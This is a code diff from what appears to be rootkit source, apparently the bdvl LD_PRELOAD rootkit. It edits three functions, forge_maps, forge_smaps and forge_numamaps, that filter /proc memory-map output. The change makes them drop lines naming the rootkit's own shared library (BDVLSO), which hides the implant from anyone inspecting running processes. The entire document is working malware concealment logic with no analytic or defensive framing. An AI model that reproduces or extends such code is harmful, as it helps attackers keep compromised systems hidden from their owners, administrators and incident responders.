@@ -9,7 +9,7 @@ FILE *forge_maps(const char *pathname){
     }
 
     while(fgets(buf, sizeof(buf), pnt) != NULL)
-        if(!strstr(INSTALL_DIR, buf))
+        if(!strstr(BDVLSO, buf))
             fputs(buf, o);
 
     fclose(pnt);
@@ -31,7 +31,7 @@ FILE *forge_smaps(const char *pathname){
     while(fgets(buf, sizeof(buf), pnt) != NULL){
         if(i > 0) i++;
         if(i > 15) i = 0;
-        if(strstr(INSTALL_DIR, buf)) i = 1;
+        if(strstr(BDVLSO, buf)) i = 1;
         if(i == 0) fputs(buf, o);
     }
 
@@ -55,7 +55,7 @@ FILE *forge_numamaps(const char *pathname){
 
     while(fgets(buf, sizeof(buf), pnt) != NULL){
         sscanf(buf, "%s %s %s", addr, type, location);
-        if(!strstr(INSTALL_DIR, location))
+        if(!strstr(BDVLSO, location))
             fputs(buf, o);
     }
 
